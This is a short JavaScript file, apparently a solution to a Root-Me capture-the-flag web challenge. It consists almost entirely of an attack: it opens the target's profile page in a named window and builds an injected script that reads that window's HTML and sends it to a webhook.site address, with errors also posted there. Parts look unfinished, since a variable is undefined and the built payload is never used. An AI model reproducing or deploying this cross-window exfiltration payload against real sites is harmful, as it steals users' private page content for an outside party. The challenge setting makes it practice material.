const ORIGIN = "https://tim-xd.github.io/web-client/index.html";
const LOGIN = "http://challenge01.root-me.org:58003/login";
const PROFILE = "http://challenge01.root-me.org:58003/profile";
const WEBHOOK = "https://webhook.site/abaf4f7a-3e2f-4fb6-aebd-9076e261d651";

function get(url) {
  let xhr = new XMLHttpRequest();
  xhr.open("GET", url, false);
  return xhr.send(null);
}

function post(url, data) {
  let xhr = new XMLHttpRequest();
  xhr.open("POST", url, false);
  return xhr.send(data);
}

try {
  const id = url.searchParams.get("id");
  if (id === "1") {
    window.open(PROFILE, "first");
    const me = window.open(ORIGIN + "?id=2", "first");
    setTimeout(() => (me.location = PROFILE), 5000);
  } else if (id === "2") {
    const payload = `<script>
const content = window.open('', 'first').document.body.innerHTML;
window.location="${WEBHOOK}?" + content;
</script>`;
    document.getElementById("login").submit();
  }
} catch (error) {
  post(WEBHOOK, `Error: ${error}`);
}
